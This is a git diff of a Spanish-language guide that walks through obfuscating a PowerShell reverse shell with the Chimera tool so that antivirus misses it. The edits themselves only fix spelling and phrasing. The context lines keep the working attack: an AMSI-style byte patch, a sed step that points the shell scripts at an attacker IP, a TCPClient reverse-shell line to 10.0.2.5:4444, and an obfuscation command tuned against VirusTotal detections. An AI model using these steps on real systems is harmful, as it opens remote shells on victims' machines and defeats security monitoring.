@@ -177,7 +177,7 @@ $Patch = [Byte[]] (0xc3, 0x90, 0x90)
 | ![](https://img.shields.io/badge/PowerShell-5-blue) | ![](https://img.shields.io/badge/-Funciona!-brightgreen) | ![](https://img.shields.io/badge/-Funciona!-brightgreen) | ![](https://img.shields.io/badge/-Funciona!-brightgreen) | ![](https://img.shields.io/badge/-Funciona!-brightgreen) | ![](https://img.shields.io/badge/-Funciona!-brightgreen) 
 | ![](https://img.shields.io/badge/PowerShell-7-blueviolet) | ![](https://img.shields.io/badge/-Funciona!-brightgreen) | ![](https://img.shields.io/badge/-Funciona!-brightgreen) | ![](https://img.shields.io/badge/-Funciona!-brightgreen) | ![](https://img.shields.io/badge/-Funciona!-brightgreen) | ![](https://img.shields.io/badge/-Funciona!-brightgreen)
 
-Una vez instalado [Chimera](https://github.com/tokyoneon/Chimera) debemos adecuar el script para que se comunique con la máquina atacante:
+Una vez instalado [Chimera](https://github.com/tokyoneon/Chimera) debemos adecuar el script para que se comunique con nuestra máquina atacante:
 
  ```bash
 /opt/chimera$ sed -i 's/192.168.56.101/10.0.2.5/g' shells/*.ps1
@@ -198,7 +198,7 @@ $client = New-Object System.Net.Sockets.TCPClient("10.0.2.5",4444);$stream = $cl
 </p>
 </details>
 
-Para ofuscarlo debemos ejectar el siguinete comando e ir probando el resultado en [VirusTotal](https://www.virustotal.com/gui/home/upload), mirando los detalles alertan las siguientes funciones: new-object y out-string. Mirando la ayuda esto es lo que podemos hacer con chimera:
+Para ofuscarlo debemos ejectar el siguiente comando e ir probando el resultado en [VirusTotal](https://www.virustotal.com/gui/home/upload). En los detalles alertan las siguientes funciones: new-object y out-string. Mirando la ayuda esto es lo que podemos hacer con chimera:
 
 -f: Archivo de entrada.<br>
 -o: Archivo de salida.<br>
@@ -210,7 +210,7 @@ Para ofuscarlo debemos ejectar el siguinete comando e ir probando el resultado e
 -h: Convertir direcciones IP addresses a hexadecimal.<br>
 -s: Substitute various strings.<br>
 -b: Marcado de palabras (importante).<br>
-Quedando de esta manera:
+Con esto nuestro comando queda de esta manera:
 
 ```bash
 /opt/chimera.sh -f /opt/shells/powershell_reverse_shell.ps1 -o /tmp/chimera.ps1 -l 4 -v -c -i -j -g -r -p -b new-object,out-string
